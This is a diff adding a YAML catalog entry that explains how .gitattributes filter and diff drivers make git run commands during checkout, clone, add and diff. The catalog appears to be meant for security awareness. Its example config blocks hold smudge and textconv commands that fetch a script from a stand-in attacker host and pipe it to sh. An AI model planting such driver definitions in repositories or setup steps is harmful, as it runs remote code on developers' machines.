@@ -1,0 +1,72 @@
+name: .gitattributes Filter Drivers
+id: gitattributes
+description: >
+  .gitattributes files can bind clean/smudge filter drivers and diff drivers to
+  file patterns. The commands backing those drivers are executed by git during
+  routine operations like checkout, add, and diff, so a committed .gitattributes
+  combined with local or config-supplied driver definitions can run code on the
+  developer's machine.
+author: LOC Team
+tags:
+  - git
+  - code-execution
+
+exploitation: |
+  Git lets a repository declare per-path attributes in `.gitattributes`. Two of
+  these attributes — `filter` and `diff` — name *drivers* whose actual commands
+  are resolved from git configuration. The `.gitattributes` file is committed and
+  travels with the repository; the driver command lives in a `.git/config`,
+  `~/.gitconfig`, or a repo-supplied config that the developer is convinced to
+  apply. When both halves line up, git runs the command automatically.
+
+  ### Clean / smudge filter drivers
+
+  A filter driver runs a `clean` command when content is staged and a `smudge`
+  command when content is checked out into the working tree. Binding a filter to
+  a broad pattern means the command fires on a normal `git checkout`, `git clone`
+  (the initial checkout), or `git add`.
+
+  `.gitattributes` (committed):
+
+  ```
+  * filter=pwn
+  ```
+
+  Driver definition in git config (e.g. `.git/config` planted via a setup script,
+  or instructions telling the dev to run the `git config` commands):
+
+  ```ini
+  [filter "pwn"]
+      smudge = curl -s https://attacker.com/x | sh
+      clean = cat
+      required = true
+  ```
+
+  With `required = true`, the smudge command runs during the working-tree
+  population step of checkout/clone — no explicit action beyond obtaining the
+  files is needed.
+
+  ### Diff driver via textconv
+
+  A diff driver's `textconv` program is invoked to render a "text" version of a
+  file whenever git produces a diff. Running `git diff`, `git log -p`, or letting
+  an IDE/host render a diff executes the configured program.
+
+  `.gitattributes`:
+
+  ```
+  *.bin diff=pwn
+  ```
+
+  git config:
+
+  ```ini
+  [diff "pwn"]
+      textconv = sh -c 'curl -s https://attacker.com/x | sh'
+  ```
+
+references:
+  - url: https://git-scm.com/docs/gitattributes
+    description: Official gitattributes documentation (filter and diff drivers)
+  - url: https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes
+    description: Pro Git - Git Attributes, clean/smudge filters and textconv
